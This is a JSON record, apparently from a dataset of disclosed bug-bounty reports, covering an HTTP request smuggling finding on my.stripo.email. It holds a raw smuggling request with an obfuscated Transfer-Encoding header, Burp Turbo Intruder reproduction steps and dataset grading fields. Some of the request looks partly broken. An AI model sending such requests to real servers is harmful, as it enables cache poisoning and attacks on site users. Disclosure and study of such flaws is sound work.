{
    "reported_to": "Stripo Inc",
    "reported_by": "codeslayer1337 ",
    "title": "HTTP Request Smuggling on my.stripo.email",
    "content": "\nSummary:\nHTTP request smuggling vulnerabilities arise when websites route HTTP requests through webservers with inconsistent HTTP parsing.\nBy supplying a request that gets interpreted as being different lengths by different servers, an attacker can poison the back-end TCP/TLS socket and prepend arbitrary data to the next request. Depending on the website's functionality, this can be used to bypass front-end security rules, access internal systems, poison web caches, and launch assorted attacks on users who are actively browsing the site.\nSteps To Reproduce:\nI use BurpSuite with the help of the HTTP Smuggler Request plugin to provide POC\n1.Run the burp suite turbo intruder on the following request\nPOST /?aeRg=2056729135 HTTP/1.1\nHost: my.stripo.email\nAccept-Encoding: gzip, deflate\nAccept: /\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nTransfer-Encoding : chunked\nContent-Len%s keep-alive\nf\nubvhq=x&e3t5b=x\n0\n2.The script for the turbo intruder is attached with the name poc.txt\n3.301 object responses OK for the post request needed to provide a header response to Location: https://codeslayer137.000webhostapp.com/indeks. php Please see the attached screenshot. (2.png).\nImpact\nImpact\nan attacker can poison the TCP / TLS socket and add arbitrary data to the next request. Depending on the functionality of the website, this can be used to bypass front-end security rules, internal system access, poison the web cache, and launch various attacks on users who actively activate the site.\nReference: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn\nBest regards\nCodeSlayer13\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "None"
    ],
    "screenshots": {},
    "disclosed_date": 1586519640,
    "report_url": "https://hackerone.com/reports/777651",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Run Burp Suite Turbo Intruder with the provided request: POST /?aeRg=2056729135 HTTP/1.1 Host: my.stripo.email Accept-Encoding: gzip, deflate Accept: / Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Transfer-Encoding : chunked Content-Len%s keep-alive f ubvhq=x&e3t5b=x 0"
        ],
        [
            2,
            "Use the attached script (poc.txt) in Turbo Intruder to execute the attack and observe the 301 redirect response pointing to the attacker's domain."
        ]
    ],
    "vuln_description": "HTTP request smuggling vulnerability on my.stripo.email allows an attacker to poison the back-end TCP/TLS socket and prepend arbitrary data to the next request. This can bypass front-end security rules, access internal systems, poison web caches, and launch attacks on active users.",
    "reason": "The attack requires understanding of HTTP request smuggling techniques, manipulation of Transfer-Encoding headers, and use of specialized tools (Burp Suite with Turbo Intruder). However, the core vulnerability pattern is well-documented and the attack follows established methodologies.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}